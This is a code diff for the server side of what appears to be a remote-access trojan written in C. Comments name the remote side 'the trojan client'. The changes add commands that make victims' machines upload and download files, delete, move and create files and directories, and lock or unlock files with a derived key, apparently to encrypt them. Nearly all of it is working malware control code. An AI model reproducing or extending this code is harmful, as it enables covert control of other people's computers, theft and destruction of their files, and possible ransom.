@@ -1,7 +1,31 @@
 #include "server.h"
+#include "mycommand.h"
 #include "myutils.h"
 #include <string.h>
 #include <arpa/inet.h>
+#include <setjmp.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+
+#define generateCommand(type) \
+void type##Command(client *c) {\
+	client *cl = genericGetClient(c);\
+	if(cl == NULL){\
+		addReply(c, shared.err);\
+		return;\
+	}\
+\
+	addReply(cl, shared.mbulkhdr[2]);\
+	addReplyBulkCString(cl, ""#type);\
+	addReplyBulkCString(cl, c->argv[2]->ptr);\
+\
+	addReply(c, shared.ok);\
+\
+}
+extern jmp_buf jmp_env;
 
 client* genericGetClient(client* c){
 	listNode *ln;
@@ -101,22 +125,6 @@ void sendCmdCommand(client *c){
 	addReply(c, shared.ok);
 }
 
-
-void delFileCommand(client *c){
-	client *cl = genericGetClient(c);
-	if(cl == NULL){
-		addReply(c, shared.err);
-		return;
-	}
-
-	addReply(cl, shared.mbulkhdr[2]);
-	addReplyBulkCString(cl, "del");
-	addReplyBulkCString(cl, c->argv[2]->ptr);
-
-	addReply(c, shared.ok);
-
-}
-
 void printchar(unsigned char c){
 		switch(c){
 		case 0:
@@ -155,7 +163,7 @@ void printhex(unsigned char buf[], int size){
 	printf("\n");
 }
 
-void lockFileCommand(client *c){
+void lockCommand(client *c){
 	unsigned char hash[20];
 	client *cl = genericGetClient(c);
 	if(cl == NULL){
@@ -164,12 +172,174 @@ void lockFileCommand(client *c){
 	}
 	gethashforaes(sdsnew(c->argv[1]->ptr), hash);
 	memset(hash + 16, 0 , 4);
-	printhex(hash, 20);
 
 	addReply(cl, shared.mbulkhdr[3]);
-	addReplyBulkCString(cl, "lock");
-	addReplyBulkCString(cl, hash);
+	if(!strcasecmp(c->argv[0]->ptr, "lock"))
+		addReplyBulkCString(cl, "lock");
+	else
+		addReplyBulkCString(cl, "unlock");
+	printhex(hash, 16);
+	addReplyBulkSds(cl, sdsnewlen(hash, 16));
 	addReplyBulkCString(cl, c->argv[2]->ptr);
 
-	addReply(c, shared.ok);
 }
+
+/* file transport*/
+void downloadCommand(client *c){
+	volatile int tfd, cfd = c->fd;
+	/* debug */
+	int count, ret;
+	packet pac;
+	client *cl = genericGetClient(c);
+
+	if(cl == NULL){
+		addReply(c, shared.err);
+		return;
+	}
+
+	aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
+	aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
+	/* unregister epoll events*/
+
+	/* send cmd to the trojan client */
+	tfd = cl->fd;
+	memset(&pac, 0, sizeof(pac));
+	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
+	ret = write(tfd, pac.data, strlen(pac.data));
+	int flags = fcntl(tfd, F_GETFL, 0);
+
+	fcntl(tfd, F_SETFL, 0);
+	if(ret < 0)
+		goto err;
+	if(setjmp(jmp_env))
+		goto err;
+	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
+	if(fork()==0){
+		while(1){
+			memset(&pac, 0, sizeof(pac));
+			alarm(5);
+			count = read(tfd, &pac, sizeof(pac));
+
+			if(count > 0){
+				switch(pac.type){
+				case 1:
+					ret = write(cfd, pac.data, sizeof(pac.data));
+					if(ret < 0)
+						goto err;
+					break;
+				case 2:
+					ret = write(cfd, pac.data, sizeof(pac.data));
+					close(cfd);
+					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+					fcntl(tfd, F_SETFL, flags);
+					exit(0);
+				default:
+					goto err;
+				}
+			}
+			else{
+err:			/* error handle*/
+				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+				pac.type = 0;
+				ret = write(cfd, &pac.data, sizeof(pac.data));
+				fcntl(tfd, F_SETFL, flags);
+				close(cfd);
+				exit(0);
+			}
+		}
+	}
+
+	addReply(c, shared.ok);
+	return ;
+}
+
+void uploadCommand(client *c){
+	struct stat stbuf;
+	packet pac;
+	int tfd, cfd = c->fd, leftcount, count, ret;
+	client *cl = genericGetClient(c);
+
+	if(cl == NULL){
+		addReply(c, shared.err);
+		return;
+	}
+
+	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
+	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
+	/* unregister epoll events*/
+
+	/* send cmd to the trojan client */
+	tfd = cl->fd;
+	memset(&pac, 0, sizeof(pac));
+	sprintf(pac.data, "*2\r\n$8\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
+	ret = write(tfd, pac.data, strlen(pac.data));
+	int flags = fcntl(tfd, F_GETFL, 0);
+
+	if(ret < 0)
+		goto err;
+	if(setjmp(jmp_env))
+		goto err;
+	if(fork() == 0){
+		fcntl(tfd, F_SETFL, 0);
+		cfd = open("testdownload.txt", O_RDWR);
+		if(fstat(cfd, &stbuf) != 0)
+			exit(0);
+		leftcount = stbuf.st_size;
+		while(1){
+			memset(&pac, 0, sizeof(pac));
+			alarm(5);
+			count = read(cfd, &pac.data, sizeof(pac.data));
+			leftcount -= count;
+			if(count > 0){
+				if(leftcount > 0)
+					pac.type = 2;
+				else
+					pac.type = 1;
+				ret = write(tfd, &pac, sizeof(pac));
+				if(ret < 0)
+					goto err;
+			}
+			else{
+err:			/* error handle*/
+				pac.type = 0;
+				ret = write(tfd, &pac.data, sizeof(pac.data));
+				fcntl(tfd, F_SETFL, flags);
+	//			aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+	//			aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+	//			aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+	//			aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+				close(cfd);
+				exit(0);
+			}
+		}
+	}
+	fcntl(tfd, F_SETFL, flags);
+	//aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
+	//aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
+	//aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
+	//aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
+
+	addReply(c, shared.ok);
+	return;
+}
+
+/*    generateComamnd using macro      */
+generateCommand(copy)
+generateCommand(cut)
+generateCommand(paste)
+generateCommand(delete)
+
+
+/* directory control */
+generateCommand(delDir)
+generateCommand(enterDir)
+generateCommand(moveDir)
+generateCommand(newDir)
+generateCommand(upDir)
+generateCommand(backDir)
